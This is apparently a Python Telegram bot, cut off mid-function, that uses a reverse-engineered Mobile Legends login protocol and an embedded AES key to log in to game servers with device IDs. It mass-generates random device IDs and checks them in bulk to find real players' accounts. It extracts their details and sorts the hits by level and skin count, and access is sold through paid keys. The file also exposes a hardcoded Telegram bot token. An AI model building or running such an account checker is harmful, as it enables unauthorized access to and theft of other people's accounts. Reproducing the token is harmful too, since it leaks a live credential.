#!/usr/bin/env python3
# ===================================================================
# DEV ID CHECKER — Telegram Bot v2.0
# -------------------------------------------------------------------
#   • NO EXTERNAL API — uses SDP protocol directly (from Dev.py)
#   • login → get_game_server → handshake → lookup (PID 11153)
#   • Bulk Check (txt upload) / Single Check / Generate + Check
#   • Key system + admin panel + channel gate
#   • Clean Railway logs (WARNING only)
#   • Watermark: @SHINRT771
# ===================================================================

from __future__ import annotations
import os, sys, time, random, uuid, json, threading, socket, zlib, io
import struct, re, logging, asyncio, zipfile, shutil, hashlib
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple
from pathlib import Path
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

import zstandard as zstd
from Crypto.Cipher import AES

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import NetworkError, BadRequest
from telegram.request import HTTPXRequest

# ────────────────────────────────────────────────────────────────
# LOGGING — WARNING only (Railway friendly)
# ────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s | %(levelname)-7s | %(message)s",
    datefmt="%H:%M:%S",
)
for noisy in ("httpx", "httpcore", "telegram", "telegram.ext",
              "telegram.request", "telegram.bot", "apscheduler",
              "urllib3", "asyncio"):
    logging.getLogger(noisy).setLevel(logging.CRITICAL)
log = logging.getLogger("devbot")
log.setLevel(logging.WARNING)

# ────────────────────────────────────────────────────────────────
# BOT CONFIG
# ────────────────────────────────────────────────────────────────

BOT_TOKEN   = "8728762913:AAFdnTyiBUuhZiwGQ1FxgbgSb9Y_B1HovXY"
OWNER_ID    = 8621676055
BOT_NAME    = "DEV ID CHECKER"
BOT_VERSION = "2.0"
BRAND       = "@SHINRT771"

REQUIRED_CHANNELS = [
    {"name": "Codm And Mlbb",   "url": "https://t.me/CodmAndMlbb",    "id": "@CodmAndMlbb"},
    {"name": "Etoshim",         "url": "https://t.me/etoshim",        "id": "@etoshim"},
    {"name": "Shin Discussion", "url": "https://t.me/ShinDisscussion", "id": "@ShinDisscussion"},
]

TELEGRAM_CONNECT_TIMEOUT = 60.0
TELEGRAM_READ_TIMEOUT    = 60.0
TELEGRAM_WRITE_TIMEOUT   = 60.0
TELEGRAM_POOL_TIMEOUT    = 60.0

TZ_WIB = timezone(timedelta(hours=7))
BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
DATA_DIR    = os.path.join(BASE_DIR, "data")
RESULTS_DIR = os.path.join(BASE_DIR, "Results")
for d in (DATA_DIR, RESULTS_DIR):
    os.makedirs(d, exist_ok=True)
USERS_FILE = Path(DATA_DIR) / "users.json"
KEYS_FILE  = Path(DATA_DIR) / "keys.json"

# ────────────────────────────────────────────────────────────────
# MLBB PROTOCOL — WORKING CONSTANTS
# ────────────────────────────────────────────────────────────────

LOGIN_HOST      = "login.ml.youngjoygame.com"
LOGIN_PORT      = 30021
CLIENT_VERSION  = "2.1.99.1205.1"
CHANNEL         = "and_usa"
LANGUAGE        = "en"
SOCKET_TIMEOUT  = 3.0
CONNECT_TIMEOUT = 3.0
TCP_NODELAY     = True
RECV_CHUNK      = 8192
MAX_THREADS     = 30

AES_KEY = bytes.fromhex("f5a193d50ade553e9835595f5cd75ddd")
AES_IV  = b"\x00" * 16

MAX_BULK_THREADS_DEFAULT = MAX_THREADS
MAX_BULK_THREADS_LIMIT   = MAX_THREADS
MIN_BULK_THREADS         = 1
MAX_GENERATE_COUNT       = 10000

# ────────────────────────────────────────────────────────────────
# HERO MAP
# ────────────────────────────────────────────────────────────────

HERO_ID_MAP: Dict[int, str] = {
    1:'Miya',2:'Balmond',3:'Saber',4:'Alice',5:'Nana',6:'Tigreal',7:'Alucard',8:'Karina',9:'Akai',10:'Franco',
    11:'Bane',12:'Bruno',13:'Clint',14:'Rafaela',15:'Eudora',16:'Zilong',17:'Fanny',18:'Layla',19:'Minotaur',20:'Lolita',
    21:'Hayabusa',22:'Freya',23:'Gord',24:'Natalia',25:'Kagura',26:'Chou',27:'Sun',28:'Alpha',29:'Ruby',30:'Yi Sun-shin',
    31:'Moskov',32:'Johnson',33:'Cyclops',34:'Estes',35:'Hilda',36:'Aurora',37:'Lapu-Lapu',38:'Vexana',39:'Roger',40:'Karrie',
    41:'Gatotkaca',42:'Harley',43:'Irithel',44:'Grock',45:'Argus',46:'Odette',47:'Lancelot',48:'Diggie',49:'Hylos',50:'Zhask',
    51:'Helcurt',52:'Pharsa',53:'Lesley',54:'Jawhead',55:'Angela',56:'Gusion',57:'Valir',58:'Martis',59:'Uranus',60:'Hanabi',
    61:"Chang'e",62:'Kaja',63:'Selena',64:'Aldous',65:'Claude',66:'Vale',67:'Leomord',68:'Lunox',69:'Hanzo',70:'Belerick',
    71:'Kimmy',72:'Thamuz',73:'Harith',74:'Minsitthar',75:'Kadita',76:'Faramis',77:'Badang',78:'Khufra',79:'Granger',80:'Guinevere',
    81:'Esmeralda',82:'Terizla',83:'X.Borg',84:'Ling',85:'Dyrroth',86:'Lylia',87:'Baxia',88:'Masha',89:'Wanwan',90:'Silvanna',
    91:'Cecilion',92:'Carmilla',93:'Atlas',94:'Popol and Kupa',95:'Yu Zhong',96:'Luo Yi',97:'Benedetta',98:'Khaleed',
    99:'Barats',100:'Brody',101:'Yve',102:'Mathilda',103:'Paquito',104:'Gloo',105:'Beatrix',106:'Phoveus',107:'Natan',108:'Aulus',
    109:'Aamon',110:'Valentina',111:'Edith',112:'Floryn',113:'Yin',114:'Melissa',115:'Xavier',116:'Julian',117:'Fredrinn',118:'Joy',
    119:'Novaria',120:'Arlott',121:'Ixia',122:'Nolan',123:'Cici',124:'Chip',125:'Zhuxin',126:'Suyou',127:'Lukas',128:'Kalea',
    129:'Zetian',130:'Obsidia'
}

def hero_name(hid: int) -> str:
    return HERO_ID_MAP.get(hid, f"Unknown({hid})")

# ────────────────────────────────────────────────────────────────
# RANK / COLLECTOR
# ────────────────────────────────────────────────────────────────

RANK_DEFS = [
    (0,4,'Warrior III'),(5,9,'Warrior II'),(10,14,'Warrior I'),
    (15,19,'Elite IV'),(20,24,'Elite III'),(25,29,'Elite II'),(30,34,'Elite I'),
    (35,39,'Master IV'),(40,44,'Master III'),(45,49,'Master II'),(50,54,'Master I'),
    (55,59,'Grandmaster IV'),(60,64,'Grandmaster III'),(65,69,'Grandmaster II'),(70,74,'Grandmaster I'),
    (75,81,'Epic IV'),(82,88,'Epic III'),(89,95,'Epic II'),(96,107,'Epic I'),
    (108,114,'Legend IV'),(115,121,'Legend III'),(122,128,'Legend II'),(129,135,'Legend I'),
    (136,160,lambda p: f"Mythic {p-135}"),
    (161,195,lambda p: f"Mythical Honor {p-135}"),
    (196,235,lambda p: f"Mythical Glory {p-157}"),
    (236,999,lambda p: f"Mythical Immortal {p-157}"),
]

def map_rank(p: int) -> str:
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx:
            return r(p) if callable(r) else r
    return "Unknown"

COLLECTOR_TIERS = [
    (0, 'None'),(1, 'Collector I'),(100, 'Collector II'),
    (300, 'Collector III'),(600, 'Collector IV'),(1000, 'Collector V'),
    (2000, 'Collector VI'),(5000, 'Collector VII'),
]

def map_collector(pts: int) -> str:
    t = 'None'
    for th, lb in COLLECTOR_TIERS:
        if pts >= th: t = lb
    return t

_AFFINITY = {0:'None',1:'Bronze',2:'Silver',3:'Gold',4:'Platinum',5:'Diamond'}
_BAN_CODES = {1:'Banned(perm)',2:'Banned(temp)',3:'Banned',4:'Suspended',5:'Restricted'}

def fmt_ts(ts: int) -> str:
    if not ts: return "Never"
    try:
        return datetime.fromtimestamp(int(ts), tz=timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
    except Exception:
        return str(ts)

def is_guest_acc(acc) -> bool:
    if acc is None: return False
    s = str(acc).strip()
    return s.startswith('221') or s.startswith('222')

# ────────────────────────────────────────────────────────────────
# SDP PROTOCOL (identical to Dev.py)
# ────────────────────────────────────────────────────────────────

class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    pass

class SdpStruct(dict):
    def __init__(self, data: Any = None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack_bin()
        elif data is not None:
            super().update(data)
            self._pack_bin()

    def _pack_bin(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _wn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _ph(self, tag: int, dt: SdpDataType):
        if tag < 15:
            self.data += bytes([dt.value << 4 | tag])
        else:
            self.data += bytes([dt.value << 4 | 15])
            self.data += self._wn(tag)

    def _pk(self, tag: int, value: Any):
        if isinstance(value, bool):
            self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wn(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._ph(tag, SdpDataType.INTEGER_NEGATIVE); self.data += self._wn(-value)
            else:
                self._ph(tag, SdpDataType.INTEGER_POSITIVE); self.data += self._wn(value)
        elif isinstance(value, float):
            self._ph(tag, SdpDataType.DOUBLE)
            p = struct.pack('<d', value); self.data += self._wn(len(p)); self.data += p
        elif isinstance(value, (str, bytes)):
            self._ph(tag, SdpDataType.STRING)
            e = value.encode() if isinstance(value, str) else value
            self.data += self._wn(len(e)); self.data += e
        elif isinstance(value, list):
            self._ph(tag, SdpDataType.LIST); self.data += self._wn(len(value))
            for i in value: self._pk(0, i)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._ph(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()): self._pk(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._ph(tag, SdpDataType.DICT); self.data += self._wn(len(value))
                for k, v in sorted(value.items()):
                    self._pk(0, k); self._pk(0, v)
        else:
            raise SdpException(f"bad type {type(value)}")

    def _unpack_bin(self):
        if not self.data: return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value: self.offset = 1
        while self.offset < len(self.data):
            t, v = self._up()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END: break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self.data[self.offset] & 127
        while self.data[self.offset + n - 1] >= 128:
            val |= (self.data[self.offset + n] & 127) << 7 * n
            n += 1
        self.offset += n
        return val

    def _up(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data): return (0, None)
            h = self.data[self.offset]
            tag = h & 15
            dt = SdpDataType(h >> 4)
            self.offset += 1
            if tag == 15: tag = self._rn()
            if dt == SdpDataType.INTEGER_POSITIVE: return (tag, self._rn())
            if dt == SdpDataType.INTEGER_NEGATIVE: return (tag, -self._rn())
            if dt == SdpDataType.FLOAT:
                return (tag, struct.unpack('<f', self._rn().to_bytes(4, 'little'))[0])
            if dt == SdpDataType.DOUBLE:
                return (tag, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
            if dt == SdpDataType.STRING:
                ln = self._rn()
                try: v = self.data[self.offset:self.offset + ln].decode()
                except Exception: v = self.data[self.offset:self.offset + ln]
                self.offset += ln
                return (tag, v)
            if dt == SdpDataType.LIST:
                ln = self._rn(); items = []
                for _ in range(ln):
                    _, i = self._up(); items.append(i)
                return (tag, items)
            if dt == SdpDataType.DICT:
                ln = self._rn(); d = {}
                for _ in range(ln):
                    _, k = self._up(); _, v = self._up(); d[k] = v
                return (tag, d)
            if dt == SdpDataType.STRUCT_BEGIN:
                sub = {}
                while True:
                    st, sv = self._up()
                    if isinstance(sv, SdpDataType) and sv == SdpDataType.STRUCT_END: break
                    sub[st] = sv
                return (tag, SdpStruct(sub))
            if dt == SdpDataType.STRUCT_END:
                return (tag, SdpDataType.STRUCT_END)
        except Exception:
            raise SdpException('unpack error')
        return (0, None)

    def copy(self):
        return SdpStruct(super().copy())

def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SdpStruct({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf

def _aes_decrypt(data: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
    return c.decrypt(data[:-1] if len(data) % 16 != 0 else data)

def _decode(ct: int, data: bytes) -> bytes:
    if ct == 1: return zlib.decompress(data)
    if ct == 16: return zstd.decompress(data)
    if ct == 2: return _aes_decrypt(data).rstrip(b'\x00')
    if ct == 3: return zlib.decompress(_aes_decrypt(data).rstrip(b'\x00'))
    if ct == 18: return zstd.decompress(_aes_decrypt(data).rstrip(b'\x00'))
    return data

# ────────────────────────────────────────────────────────────────
# CONNECTION
# ────────────────────────────────────────────────────────────────

class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket: Optional[socket.socket] = None
        self.queue_data = b''

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if TCP_NODELAY:
            try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception: pass
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.host, self.port))
        s.settimeout(SOCKET_TIMEOUT)
        self.socket = s

    def cleanup(self):
        if self.socket:
            try: self.socket.close()
            except Exception: pass
            self.socket = None
            self.sequence = 1
            self.queue_data = b''

    def send_data(self, pid: int, sdp: SdpStruct):
        self.socket.send(_frame(pid, self.sequence, sdp.data))
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue_data) < 4:
                d = self.socket.recv(RECV_CHUNK)
                if not d: return (None, None)
                self.queue_data += d
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 16777215
            ct = flags >> 24
            while len(self.queue_data) < size:
                d = self.socket.recv(RECV_CHUNK)
                if not d: return (None, None)
                self.queue_data += d
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            data = _decode(ct, data)
            r = SdpStruct(data)
            pid = r[0]
            if pid is None: return (None, None)
            res = r.get(6) or r.get(5)
            if not res or not isinstance(res, bytes):
                return (pid, None)
            return (pid, SdpStruct(res))
        except socket.timeout:
            return (-1, None)
        except Exception:
            return (None, None)


class GameConnection(BaseConnection):
    def __init__(self, device_id: str):
        super().__init__(LOGIN_HOST, LOGIN_PORT)
        self.device_id = device_id
        self.imei_md5, self.android_id, self.advertising_id = self._parse(device_id)
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.ban_status = 'Unknown'
        self.ban_end_ts = 0

    @staticmethod
    def _parse(did: str) -> Tuple[str, str, str]:
        parts = did.split('_')
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info += '_' + parts[2]
            if len(info) >= 32:
                imei = info[:32]
                android = info[32:48] if len(info) >= 48 else ''
                adv = info[48:] if len(info) > 48 else ''
            else:
                imei, android, adv = info, '', ''
        else:
            imei, android, adv = did, '', ''
        return (imei, android, adv)

    def login_to_login_server(self) -> bool:
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: LANGUAGE,
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            z = res[2]
            self.zone_id = z[0] if isinstance(z, (list, tuple)) and z else (z if isinstance(z, int) else 0)
            err = res.get(10, 0)
            if err in (3, 4, 5, 6, 100, 101, 102):
                self.ban_status = 'BANNED'
                self.ban_end_ts = res.get(20, 0)
            return True
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.client_version, 5: self.zone_id, 6: self.channel,
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            raw = res[1]
            if isinstance(raw, bytes):
                raw = raw.decode('utf-8', errors='ignore')
            self.game_server_host, port = raw.split(':')
            self.game_server_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id, 1: self.session_key,
            2: self.zone_id, 4: self.client_version,
            13: self.channel, 15: self.device_id,
        }))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(20):
            pid, _ = self.recv_data()
            if pid is None or pid == -1: return False
            if pid == 10002: return True
            if pid not in (20001,): return False
        return False

    def lookup_player(self, search_value: Any) -> Optional[SdpStruct]:
        self.send_data(11153, SdpStruct({1: int(search_value)}))
        cnt = 0
        while True:
            pid, res = self.recv_data()
            if pid is None or pid == -1: return None
            if pid == 11154: return res
            if pid == 20001:
                cnt += 1
                if cnt >= 5: return None

# ────────────────────────────────────────────────────────────────
# EXTRACTOR (identical to Dev.py)
# ────────────────────────────────────────────────────────────────

def extract_player_data(result: Any) -> Optional[Dict[str, Any]]:
    if not result or not result[0] or len(result[0]) == 0: return None
    try:
        pd = result[0][0]
        nickname = pd.get(2, 'Unknown')
        player_id = pd.get(0, 'Unknown')
        server = pd.get(1, 'Unknown')
        level = pd.get(3, 'Unknown')
        bc = pd.get(39, pd.get(40, 0))
        bet = pd.get(41, 0)

        if isinstance(bc, int) and bc in _BAN_CODES:
            ban_status = _BAN_CODES[bc]
        elif isinstance(bc, int) and bc > 0:
            ban_status = f'Banned(code {bc})'
        else:
            ban_status = 'Not Banned'
        ban_end = fmt_ts(bet) if bet else 'N/A'

        try: skin_count = int(pd.get(83, 0))
        except Exception: skin_count = 0

        last_login = fmt_ts(pd.get(5, 0))
        llc = pd.get(87, 'Unknown')
        try: hero_count = int(pd.get(4, 0))
        except Exception: hero_count = 0
        try: win = int(pd.get(18, 0))
        except Exception: win = 0
        try: loss = int(pd.get(155, 0))
        except Exception: loss = 0
        total = win + loss
        wr = f'{win / total * 100:.2f}%' if total > 0 else 'N/A'

        loc = 'NOT FOUND'
        ld = pd.get(71)
        if ld and isinstance(ld, list) and len(ld) >= 2:
            loc = ', '.join(str(x) for x in ld)

        sn = str(pd.get(30, '')).replace('`', '').strip()
        si = str(pd.get(31, ''))
        squad = f'{si} {sn}'.strip() if sn else '—'
        sqid = pd.get(34, pd.get(28, 0))
        squad_id = f'Squad ID: {sqid}' if sqid else 'N/A'

        hr = map_rank(pd.get(95)) if pd.get(95) is not None else 'Unknown'
        cr = map_rank(pd.get(8)) if pd.get(8) is not None else 'Unknown'

        t136 = pd.get(136, {})
        try: cpt = int(t136.get(9, 0)) if isinstance(t136, dict) else 0
        except Exception: cpt = 0
        ctier = map_collector(cpt)

        aff_lv = (pd.get(135, {}) or {}).get(1, 0) if isinstance(pd.get(135, {}), dict) else 0
        affinity = _AFFINITY.get(aff_lv, f'Lv{aff_lv}') if aff_lv else 'None'
        cac = pd.get(97, 'Unknown')

        t91 = pd.get(91, [])
        lmh = hero_name(t91[0]) if isinstance(t91, list) and t91 else None
        prev: List[str] = []
        if isinstance(t91, list) and len(t91) > 1:
            seen: set = set()
            for hid in t91[1:]:
                try: hid_i = int(hid)
                except Exception: continue
                if hid_i not in seen:
                    seen.add(hid_i); prev.append(hero_name(hid_i))
                if len(prev) >= 5: break
        lm = {'hero_name': lmh, 'prev': prev} if lmh else None

        return {
            'nickname': nickname, 'player_id': player_id, 'server': server,
            'level': level, 'ban_status': ban_status, 'ban_end': ban_end,
            'skin_count': skin_count, 'last_login': last_login,
            'last_login_country': llc, 'create_country': cac,
            'hero_count': hero_count, 'location': loc,
            'high_rank': hr, 'current_rank': cr,
            'collector_tier': ctier, 'collector_point': cpt,
            'squad': squad, 'squad_id': squad_id, 'affinity': affinity,
            'total_battles': total, 'win_rate': wr, 'last_match': lm,
        }
    except Exception:
        return None

# ────────────────────────────────────────────────────────────────
# CHECK DEVICE — NO API (uses SDP directly)
# ────────────────────────────────────────────────────────────────

def check_device_id(device_id: str) -> Dict[str, Any]:
    device_id = device_id.strip()
    if not device_id or len(device_id) < 10:
        return {'status': 'error', 'device_id': device_id, 'error': 'ID too short'}

    conn: Optional[GameConnection] = None
    try:
        conn = GameConnection(device_id)
        conn.connect()

        if not conn.login_to_login_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Login failed'}

        aid = conn.account_id
        bfl = conn.ban_status
        bel = conn.ban_end_ts

        if not aid or is_guest_acc(aid):
            conn.cleanup()
            return {'status': 'unregistered', 'device_id': device_id}

        if not conn.get_game_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Server resolve failed'}

        if not conn.connect_to_game_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Handshake failed'}

        result = conn.lookup_player(aid)
        conn.cleanup()

        if not result:
            return {'status': 'error', 'device_id': device_id, 'error': 'Lookup returned no data'}

        player = extract_player_data(result)
        if not player:
            return {'status': 'error', 'device_id': device_id, 'error': 'Parse failed'}

        if bfl and bfl != 'Unknown' and player.get('ban_status') == 'Not Banned':
            player['ban_status'] = bfl
            player['ban_end'] = fmt_ts(bel) if bel else 'N/A'

        return {'status': 'success', 'device_id': device_id, 'player_data': player}
    except Exception as exc:
        if conn:
            try: conn.cleanup()
            except Exception: pass
        return {'status': 'error', 'device_id': device_id, 'error': str(exc)}

# ────────────────────────────────────────────────────────────────
# DEVICE GENERATOR
# ────────────────────────────────────────────────────────────────

def generate_device_ids(count: int) -> List[str]:
    ids = []
    for _ in range(count):
        imei = ''.join(str(random.randint(0, 9)) for _ in range(15))
        md5 = hashlib.md5(imei.encode()).hexdigest()
        aid = '%016x' % random.getrandbits(64)
        adv = str(uuid.UUID(int=random.getrandbits(128)))
        ids.append(f'and_{md5}{aid}{adv}')
    return ids

# ────────────────────────────────────────────────────────────────
# SAVE HELPERS
# ────────────────────────────────────────────────────────────────

LEVEL_BRACKETS = [
    (9, 30, 'level_9-30.txt'),
    (31, 50, 'level_31-50.txt'),
    (51, 100, 'level_51-100.txt'),
    (101, 200, 'level_101-200.txt'),
    (201, 9999, 'level_200plus.txt'),
]
SKIN_BRACKETS = [
    (20, 50, 'skin_20-50.txt'),
    (51, 100, 'skin_51-100.txt'),
    (101, 200, 'skin_101-200.txt'),
    (201, 300, 'skin_201-300.txt'),
    (301, 400, 'skin_301-400.txt'),
    (401, 9999, 'skin_401-700plus.txt'),
]

def _lv_file(lv_dir: str, lvl: int) -> Optional[str]:
    for mn, mx, fn in LEVEL_BRACKETS:
        if mn <= lvl <= mx: return os.path.join(lv_dir, fn)
    return None

def _sk_file(sk_dir: str, skin: int) -> Optional[str]:
    for mn, mx, fn in SKIN_BRACKETS:
        if mn <= skin <= mx: return os.path.join(sk_dir, fn)
    return None

def _save_line(did: str, p: Dict[str, Any]) -> str:
    lm = p.get('last_match') or {}
    lh = lm.get('hero_name', 'N/A')
    ban = p.get('ban_status', 'N/A')
    be = p.get('ban_end', 'N/A')
    ban_f = f'{ban}(ends:{be})' if ('Banned' in ban or 'Suspended' in ban) and be != 'N/A' else ban
    return (f"Device ID: {did} | Name: {p.get('nickname', 'N/A')} | "
            f"Role ID: {p.get('player_id', 'N/A')} | Server ID: {p.get('server', 'N/A')} | "
            f"Level: {p.get('level', 'N/A')} | Ban: {ban_f} | "
            f"Skin: {p.get('skin_count', 'N/A')} | Last Login: {p.get('last_login', 'N/A')} | "
            f"Country: {p.get('last_login_country', 'N/A')} | Rank: {p.get('current_rank', 'N/A')} | "
            f"High Rank: {p.get('high_rank', 'N/A')} | Win Rate: {p.get('win_rate', 'N/A')} | "
            f"Heroes: {p.get('hero_count', 0)} | Matches: {p.get('total_battles', 0)} | "
            f"Last Hero: {lh} | Squad: {p.get('squad', '—')} | "
            f"Collector: {p.get('collector_tier', 'None')} | Reg: {p.get('create_country', 'N/A')}")

# ────────────────────────────────────────────────────────────────
# USER MANAGER
# ────────────────────────────────────────────────────────────────

active_jobs = {}
job_lock = threading.Lock()

class UserManager:
    def __init__(self): self._load()

    def _load(self):
        try:
            self.users = json.loads(USERS_FILE.read_text()) if USERS_FILE.exists() else {"users": {}}
            if "users" not in self.users: self.users = {"users": {}}
        except Exception: self.users = {"users": {}}
        try:
            self.keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else {"keys": {}}
            if "keys" not in self.keys: self.keys = {"keys": {}}
        except Exception: self.keys = {"keys": {}}
        self._su(); self._sk()

    def _su(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _sk(self): KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._su()
    async def _save_keys(self): self._sk()

    async def register_user(self, uid, u=None, f=None):
        k = str(uid)
        if k not in self.users["users"]:
            self.users["users"][k] = {
                "username": u, "first_name": f,
                "joined": datetime.now().isoformat(),
                "banned": False, "key_expiry": None,
                "threads_limit": MAX_BULK_THREADS_DEFAULT,
                "stats": {"total_checked": 0, "total_hits": 0},
                "activated": False,
            }
            await self._save_users(); return True
        return False

    async def is_authorized(self, uid):
        k = str(uid)
        if k == str(OWNER_ID): return True, "admin"
        u = self.users["users"].get(k)
        if not u: return False, "not_registered"
        if u.get("banned"): return False, "banned"
        e = u.get("key_expiry")
        if e is None: return False, "no_key"
        try:
            if datetime.fromisoformat(e) < datetime.now(): return False, "key_expired"
        except Exception: return False, "invalid_expiry"
        return True, "ok"

    async def ban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = True; await self._save_users(); return True
        return False

    async def unban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = False; await self._save_users(); return True
        return False

    async def set_key_expiry(self, uid, dt):
        k = str(uid)
        if k not in self.users["users"]: return False
        self.users["users"][k]["key_expiry"] = dt.isoformat()
        self.users["users"][k]["activated"] = True
        await self._save_users(); return True

    async def generate_key(self, dur, unit, qty=1, mu=1):
        if unit in ('lifetime', 'l'):
            e = datetime(9999, 12, 31, 23, 59, 59); d = "Lifetime"
        else:
            um = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400, 'y': 31536000,
                  'hours': 3600, 'days': 86400, 'months': 2592000}
            e = datetime.now() + timedelta(seconds=dur * um.get(unit.lower(), 86400))
            d = f"{dur} {unit}"
        ks = []
        for _ in range(qty):
            k = f"DEV-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while k in self.keys["keys"]:
                k = f"DEV-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][k] = {
                "created": datetime.now().isoformat(), "expiry": e.isoformat(),
                "used_by": [], "duration": d, "max_users": mu, "dtype": unit, "dval": dur,
            }
            ks.append(k)
        await self._save_keys(); return ks, d

    async def redeem_key(self, uid, key):
        k = str(uid); kd = self.keys["keys"].get(key)
        if not kd: return False, "Invalid key"
        used = kd.get("used_by", [])
        if k in used: return False, "Key already used by you"
        if len(used) >= kd.get("max_users", 1): return False, "Key max users reached"
        e = datetime.fromisoformat(kd["expiry"])
        if e < datetime.now(): return False, "Key expired"
        used.append(k); kd["used_by"] = used
        await self._save_keys(); await self.set_key_expiry(uid, e)
        return True, f"Key redeemed! Valid until {e.strftime('%Y-%m-%d %H:%M')}"

    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, uid): return self.users["users"].get(str(uid))

    async def get_threads_limit(self, uid):
        u = self.users["users"].get(str(uid))
        if not u: return MAX_BULK_THREADS_DEFAULT
        try: tl = int(u.get("threads_limit", MAX_BULK_THREADS_DEFAULT) or MAX_BULK_THREADS_DEFAULT)
        except Exception: tl = MAX_BULK_THREADS_DEFAULT
        if tl < MIN_BULK_THREADS: tl = MIN_BULK_THREADS
        if tl > MAX_BULK_THREADS_LIMIT: tl = MAX_BULK_THREADS_LIMIT
        return tl

    async def update_stats(self, uid, checked=0, hits=0):
        k = str(uid); u = self.users["users"].get(k)
        if not u: return
        s = u.setdefault("stats", {})
        s["total_checked"] = s.get("total_checked", 0) + checked
        s["total_hits"] = s.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ────────────────────────────────────────────────────────────────
# LIVE STATS
# ────────────────────────────────────────────────────────────────

class LiveStats:
    def __init__(self, total):
        self.lock = threading.Lock()
        self.total = total
        self.checked = 0
        self.hits = 0
        self.invalid = 0
        self.errors = 0
        self.filtered = 0
        self.start_ts = time.time()

    def inc(self, key, n=1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)

    def snapshot(self):
        with self.lock:
            el = max(time.time() - self.start_ts, 0.001)
            spd = self.checked / el
            rem = max(self.total - self.checked, 0)
            eta = rem / spd if spd > 0.01 else 0
            return {
                "total": self.total, "checked": self.checked,
                "hits": self.hits, "invalid": self.invalid,
                "errors": self.errors, "filtered": self.filtered,
                "elapsed": el, "speed": spd, "eta": eta,
            }

# ────────────────────────────────────────────────────────────────
# DESIGN
# ────────────────────────────────────────────────────────────────

LINE_HEAVY = "━" * 28
LINE_DOT   = "┈" * 28

def panel_title(t): return f"◇  *{t.upper()}*  ◇\n{LINE_HEAVY}"

def _bar(pct, w=20):
    pct = max(0.0, min(100.0, pct))
    f = int(w * pct / 100)
